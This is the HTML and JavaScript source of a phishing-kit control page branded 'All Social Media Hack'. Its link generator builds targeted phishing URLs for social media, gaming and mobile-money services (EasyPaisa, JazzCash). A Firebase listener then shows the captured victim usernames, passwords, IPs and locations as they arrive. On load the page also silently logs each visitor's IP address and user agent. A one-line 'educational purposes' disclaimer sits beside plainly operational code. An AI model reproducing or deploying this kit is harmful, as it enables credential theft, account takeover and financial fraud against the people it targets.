<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>All Social Media Hack</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="firebase-config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            color: #fff;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        
        .banner {
            text-align: center;
            padding: 40px 20px;
            background: linear-gradient(45deg, #ff0000, #ff6600, #ffcc00);
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(255,0,0,0.3);
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { box-shadow: 0 10px 30px rgba(255,0,0,0.3); }
            to { box-shadow: 0 10px 50px rgba(255,0,0,0.7); }
        }
        .banner h1 {
            font-size: 3em;
            text-shadow: 3px 3px 6px rgba(0,0,0,0.5);
            letter-spacing: 2px;
        }
        .banner h1 span { color: #000; }
        .banner .sub {
            font-size: 1.2em;
            margin-top: 10px;
            color: #fff;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .developer {
            text-align: center;
            padding: 15px;
            margin-bottom: 30px;
            font-size: 1.3em;
            color: #00ff88;
        }
        .developer .icon { font-size: 1.5em; }
        .developer .name {
            background: linear-gradient(45deg, #ff0000, #ffff00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }
        
        .disclaimer {
            background: rgba(0,0,0,0.7);
            border-left: 5px solid #ffcc00;
            padding: 15px 20px;
            margin-bottom: 30px;
            border-radius: 0 10px 10px 0;
            font-size: 0.95em;
            color: #ffcc00;
            text-align: center;
        }
        
        .categories {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .category-card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .category-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            border-color: #ff6600;
        }
        .category-card .icon {
            font-size: 4em;
            margin-bottom: 15px;
        }
        .category-card h3 {
            font-size: 1.5em;
            margin-bottom: 10px;
        }
        .category-card .status {
            display: inline-block;
            padding: 5px 15px;
            background: #00cc44;
            border-radius: 20px;
            font-size: 0.85em;
            margin-top: 10px;
        }
        .category-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
            transition: 0.5s;
        }
        .category-card:hover::before { left: 100%; }
        
        .link-generator {
            background: rgba(0,0,0,0.5);
            border-radius: 15px;
            padding: 30px;
            margin: 40px 0;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .link-generator h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #ff6600;
        }
        .link-generator select, .link-generator input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 10px;
            color: #fff;
            font-size: 1em;
        }
        .link-generator select option { background: #1a1a2e; }
        .link-generator button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff6600, #ff3300);
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .link-generator button:hover { transform: scale(1.02); box-shadow: 0 5px 20px rgba(255,102,0,0.4); }
        .generated-link {
            margin-top: 15px;
            padding: 15px;
            background: rgba(0,255,0,0.1);
            border: 1px solid #00ff00;
            border-radius: 10px;
            word-break: break-all;
            display: none;
        }
        
        @media (max-width: 768px) {
            .banner h1 { font-size: 2em; }
            .categories { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="banner">
            <h1>🔥 <span>All</span> SOCIAL MEDIA HACK 🔥</h1>
            <div class="sub">Powerfull Social Media Hacking Tool ⚡</div>
        </div>
        
        <div class="developer">
            👨‍💻 Developer: <span class="name">Nawab Zada Hacker</span> 
            <span class="icon">☠️✌️🦅</span>
        </div>
        
        <div class="disclaimer">
            ⚠️ This Tool is only for Educational purposes please don't use..⚠️
        </div>
        
        <div class="link-generator">
            <h2>🔗 Generate Phishing Link</h2>
            <select id="serviceSelect">
                <option value="">-- Select Service --</option>
                <option value="whatsapp">📱 WhatsApp Hack</option>
                <option value="tiktok">🎵 TikTok Hack</option>
                <option value="facebook">📘 Facebook Hack</option>
                <option value="instagram">📸 Instagram Hack</option>
                <option value="snapchat">👻 SnapChat Hack</option>
                <option value="freefire">🔫 Free Fire Hack</option>
                <option value="easypaisa">💳 EasyPaisa</option>
                <option value="jazzcash">🏦 JazzCash</option>
                <option value="twitter">🐦 Twitter Hack</option>
            </select>
            <input type="text" id="targetEmail" placeholder="Enter Target Email / Username / Phone">
            <button onclick="generateLink()">Generate Link</button>
            <div class="generated-link" id="generatedLink"></div>
        </div>
        
        <div class="categories" id="categoriesGrid"></div>
    </div>
    
    <script>
        let visitorIP = '';
        let visitorID = generateVisitorID();
        
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                visitorIP = data.ip;
                db.ref('visitors/' + visitorID).set({
                    ip: visitorIP,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent
                });
            })
            .catch(() => {
                visitorIP = 'Unknown';
            });
        
        function generateVisitorID() {
            return 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }
        
        const categories = [
            { name: 'WhatsApp Hack', icon: '📱', page: 'whatsapp', color: '#25D366', desc: 'Free Blue Tick, Account Hack' },
            { name: 'TikTok Hack', icon: '🎵', page: 'tiktok', color: '#000', desc: 'Free Likes, Views, Followers, Monetize' },
            { name: 'FaceBook Hack', icon: '📘', page: 'facebook', color: '#1877F2', desc: 'Account Hack, Free Followers' },
            { name: 'Instagram Hack', icon: '📸', page: 'instagram', color: '#E4405F', desc: 'Account Hack, Free Followers' },
            { name: 'SnapChat Hack', icon: '👻', page: 'snapchat', color: '#FFFC00', desc: 'Account Hack, Free Snap Score' },
            { name: 'Free Fire Hack', icon: '🔫', page: 'freefire', color: '#FF6600', desc: 'Free Diamonds, Unlimited Bundle' },
            { name: 'EasyPaisa', icon: '💳', page: 'easypaisa', color: '#00A859', desc: 'Account Balance Hack' },
            { name: 'JazzCash', icon: '🏦', page: 'jazzcash', color: '#ED1C24', desc: 'Account Balance Hack' },
            { name: 'Twitter Hack', icon: '🐦', page: 'twitter', color: '#1DA1F2', desc: 'Account Hack, Free Followers' }
        ];
        
        const grid = document.getElementById('categoriesGrid');
        categories.forEach(cat => {
            const card = document.createElement('div');
            card.className = 'category-card';
            card.style.borderColor = cat.color;
            card.innerHTML = `
                <div class="icon">${cat.icon}</div>
                <h3>${cat.name}</h3>
                <p style="color: #aaa; font-size: 0.9em;">${cat.desc}</p>
                <div class="status">✅ Online</div>
            `;
            card.onclick = () => {
                window.location.href = `pages/${cat.page}.html`;
            };
            grid.appendChild(card);
        });
        
        function generateLink() {
            const service = document.getElementById('serviceSelect').value;
            const target = document.getElementById('targetEmail').value;
            
            if (!service || !target) {
                alert('❌ Please select a service and enter target info!');
                return;
            }
            
            const linkID = 'link_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
            const fullLink = window.location.origin + '/pages/' + service + '.html?id=' + linkID + '&target=' + encodeURIComponent(target);
            
            db.ref('generated_links/' + linkID).set({
                service: service,
                target: target,
                link: fullLink,
                generatedBy: visitorID,
                generatorIP: visitorIP,
                timestamp: Date.now(),
                status: 'active'
            });
            
            const linkDiv = document.getElementById('generatedLink');
            linkDiv.style.display = 'block';
            linkDiv.innerHTML = `
                <strong>✅Link Generated Successfully!</strong><br>
                <span style="color: #0f0;">${fullLink}</span><br><br>
                <button onclick="copyLink('${fullLink}')" style="padding:10px 20px;background:#00cc44;border:none;border-radius:5px;color:#fff;cursor:pointer;">📋 Copy Link</button>
                <br><br>
                <span style="color: #ffcc00;font-size:0.85em;">⏳ Target data will appear here when they login...</span>
                <div id="liveData_${linkID}" style="margin-top:15px;padding:10px;background:rgba(0,255,0,0.1);border-radius:5px;display:none;"></div>
            `;
            
            db.ref('captured_data/' + linkID).on('value', snapshot => {
                const data = snapshot.val();
                if (data) {
                    const liveDiv = document.getElementById('liveData_' + linkID);
                    if (liveDiv) {
                        liveDiv.style.display = 'block';
                        liveDiv.innerHTML = `
                            <strong style="color:#0f0;">🔓DATA CAPTURED!</strong><br>
                            👤 Username: ${data.username || 'N/A'}<br>
                            🔑 Password: ${data.password || 'N/A'}<br>
                            🌐 IP: ${data.ip || 'N/A'}<br>
                            📍 Location: ${data.location || 'Unknown'}<br>
                            🕐 Time: ${new Date(data.timestamp).toLocaleString()}
                        `;
                    }
                }
            });
        }
        
        function copyLink(link) {
            navigator.clipboard.writeText(link).then(() => {
                alert('✅ Link copied to clipboard!');
            });
        }
    </script>
</body>
</html>
